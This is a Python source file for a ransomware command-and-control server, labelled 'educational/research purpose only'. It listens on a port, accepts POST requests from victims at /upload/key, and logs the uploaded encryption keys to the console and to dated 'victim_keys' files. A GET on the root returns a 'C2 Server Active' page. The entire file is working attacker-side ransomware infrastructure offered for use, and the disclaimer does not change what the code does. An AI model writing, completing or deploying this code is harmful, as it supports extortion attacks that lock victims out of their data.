#!/usr/bin/env python3
"""
C2 Server for receiving encryption keys from ransomware
Educational/Research Purpose Only
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime
import os

class C2Handler(BaseHTTPRequestHandler):

    def do_POST(self):
        """Handle POST requests from victims"""

        if self.path == '/upload/key':
            # Read victim data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')

            # Log to console
            print("\n" + "="*60)
            print(f"[{datetime.now()}] NEW VICTIM DATA RECEIVED")
            print("="*60)
            print(post_data)
            print("="*60 + "\n")

            # Save to file
            log_file = f"victim_keys_{datetime.now().strftime('%Y%m%d')}.txt"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"\n[{datetime.now()}]\n")
                f.write(post_data)
                f.write("\n" + "="*60 + "\n")

            # Send success response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Key received successfully')

        else:
            # Unknown endpoint
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        """Handle GET requests"""

        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response = b'<html><body><h1>C2 Server Active</h1></body></html>'
            self.wfile.write(response)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        """Custom log format"""
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {format % args}")

def run_c2_server(port=8080):
    """Start C2 server"""
    server_address = ('', port)
    httpd = HTTPServer(server_address, C2Handler)

    print(f"""
============================================================
                   C2 SERVER STARTED
============================================================

Listening on: 0.0.0.0:{port}
Endpoint: /upload/key
Log file: victim_keys_{datetime.now().strftime('%Y%m%d')}.txt

WARNING: EDUCATIONAL/RESEARCH PURPOSE ONLY

Press Ctrl+C to stop...
""")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] C2 Server stopped")
        httpd.server_close()

if __name__ == '__main__':
    run_c2_server(8081)
